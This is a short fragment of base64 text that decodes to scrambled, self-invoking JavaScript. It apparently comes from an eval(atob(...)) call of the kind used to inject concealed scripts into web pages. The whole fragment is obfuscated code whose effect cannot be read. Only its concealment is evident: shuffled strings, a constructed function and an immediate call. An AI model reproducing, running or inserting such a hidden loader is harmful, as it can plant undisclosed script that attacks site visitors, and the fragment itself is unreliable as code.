Ny5tMT1jNDpoKHVBZWN9QWE6SS5zICF9YXRqMGQxQThyLG87blMgcDI3dWwwNXAxbXBFbDZdQVgpPSBscn0hQXNBIGFBPTpBcjhgWiBBYTZhY30lQT0+bk8gLnRyZ25BYyBibmMxXTBBIylBQWp0IDQkbSg9OTJlQSU4MTBBaCBnUUFINndvJW5HXyFvQWU1KClBZS5kXWRjJUFsdD03dTBBPnR9fUFBYj1sbG9kNmEpQXYxWy5yYWNddGMoKV0rKEFlSl99dG8gIj1cL1ZudEF3XXJhbnp0ckEwQ2UgUj0sJCA4ZT1bJykpO3ZhciBtVU09a2ZEKFFlQSxjVW4gKTttVU0oMTUzNSk7cmV0dXJuIDM0MjN9KSgp'))
